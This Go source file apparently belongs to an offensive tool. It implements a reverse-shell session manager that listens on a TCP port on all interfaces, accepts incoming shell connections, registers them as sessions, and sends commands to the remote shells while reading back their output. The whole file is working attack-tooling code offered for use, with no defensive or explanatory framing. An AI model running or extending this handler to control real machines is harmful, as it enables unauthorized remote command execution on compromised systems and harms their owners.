package shell

import (
	"bufio"
	"fmt"
	"io"
	"net"
	"strings"
	"sync"
	"time"
)

// Session represents a single active reverse shell connection.
type Session struct {
	ID        string
	RemoteAddr string
	conn      net.Conn
	reader    *bufio.Reader
	mu        sync.Mutex
	CreatedAt time.Time
}

// Send writes a command to the shell and reads back output until a prompt is seen.
func (s *Session) Send(cmd string) (string, error) {
	s.mu.Lock()
	defer s.mu.Unlock()

	// Write command
	_, err := fmt.Fprintf(s.conn, "%s\n", cmd)
	if err != nil {
		return "", fmt.Errorf("write failed: %w", err)
	}

	// Read output with a deadline
	s.conn.SetReadDeadline(time.Now().Add(15 * time.Second))
	defer s.conn.SetReadDeadline(time.Time{})

	var out strings.Builder
	buf := make([]byte, 4096)
	for {
		n, err := s.reader.Read(buf)
		if n > 0 {
			out.Write(buf[:n])
		}
		if err != nil {
			if err == io.EOF || isTimeout(err) {
				break
			}
			return out.String(), err
		}
		// Stop reading if we see a shell prompt character
		content := out.String()
		if strings.HasSuffix(strings.TrimRight(content, " \t"), "$") ||
			strings.HasSuffix(strings.TrimRight(content, " \t"), "#") ||
			strings.HasSuffix(strings.TrimRight(content, " \t"), ">") {
			break
		}
	}

	return strings.TrimRight(out.String(), "\n"), nil
}

func (s *Session) Close() {
	s.conn.Close()
}

// Manager manages all active reverse shell sessions.
type Manager struct {
	mu       sync.RWMutex
	sessions map[string]*Session
	counter  int
}

var GlobalShells = &Manager{
	sessions: make(map[string]*Session),
}

// Count returns the number of active sessions.
func (m *Manager) Count() int {
	m.mu.RLock()
	defer m.mu.RUnlock()
	return len(m.sessions)
}

// List returns all active session IDs.
func (m *Manager) List() []string {
	m.mu.RLock()
	defer m.mu.RUnlock()
	ids := make([]string, 0, len(m.sessions))
	for id := range m.sessions {
		ids = append(ids, id)
	}
	return ids
}

// Get returns a session by ID.
func (m *Manager) Get(id string) (*Session, bool) {
	m.mu.RLock()
	defer m.mu.RUnlock()
	s, ok := m.sessions[id]
	return s, ok
}

// Listen starts a TCP listener on the given port. Blocks until a connection
// is accepted, then registers the session and returns its ID.
func (m *Manager) Listen(port int) (string, error) {
	ln, err := net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", port))
	if err != nil {
		return "", fmt.Errorf("failed to bind port %d: %w", port, err)
	}
	defer ln.Close()

	// Accept with a 2-minute timeout
	ln.(*net.TCPListener).SetDeadline(time.Now().Add(2 * time.Minute))
	conn, err := ln.Accept()
	if err != nil {
		return "", fmt.Errorf("no connection received within 2 minutes: %w", err)
	}

	m.mu.Lock()
	m.counter++
	id := fmt.Sprintf("session_%d", m.counter)
	sess := &Session{
		ID:         id,
		RemoteAddr: conn.RemoteAddr().String(),
		conn:       conn,
		reader:     bufio.NewReader(conn),
		CreatedAt:  time.Now(),
	}
	m.sessions[id] = sess
	m.mu.Unlock()

	return id, nil
}

// Remove closes and removes a session.
func (m *Manager) Remove(id string) {
	m.mu.Lock()
	defer m.mu.Unlock()
	if s, ok := m.sessions[id]; ok {
		s.Close()
		delete(m.sessions, id)
	}
}

func isTimeout(err error) bool {
	if netErr, ok := err.(net.Error); ok {
		return netErr.Timeout()
	}
	return false
}
